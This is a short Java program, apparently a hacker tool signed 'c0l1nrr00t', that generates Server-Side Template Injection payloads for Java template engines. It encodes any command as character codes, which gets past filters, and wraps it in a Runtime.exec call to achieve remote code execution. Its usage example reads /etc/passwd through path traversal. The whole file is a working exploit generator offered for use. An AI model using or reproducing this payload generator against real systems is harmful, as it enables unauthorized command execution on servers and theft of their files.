
class myGenPayload
{
	public static void main(String args[])
	{
		/*
			Uso de la aplicacion
		*/
		if(args.length == 0)
		{
			System.out.println("-----------------------------c0l1nrr00t---------------------------\n");
			System.out.println("Gen Payload SSTI - JAVA");
			System.out.println("usage : java myGenPayload command");
			System.out.println("example : java myGenPayload cat ../../../../etc/passwd");

			System.out.println("------------------------------------------------------------------\n");
			System.exit(0);
		}
		String payload="*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(";
		String endPayload = ").getInputStream())}";
		String commando="";
		
		// save the arguments to command
		for (int i=0; i<args.length; i++)
			commando+=args[i]+" ";
		int tam = commando.length();
		System.out.println("COMANDOO==>"+commando);
		char[] chars = commando.toCharArray();
		int [] ascii = new int [tam];

		String rce = "";	
		for (int i = 0; i<tam-1; i++){
			ascii[i] = (int)chars[i];
			
			if( i == 0 )
				rce += "T(java.lang.Character).toString("+ascii[i]+")";
			else
				rce += ".concat(T(java.lang.Character).toString("+ascii[i]+"))";
			
			if((i+1) == (tam-1))
				rce += endPayload;
		}
		payload += rce;

		System.out.println(payload);
	}
}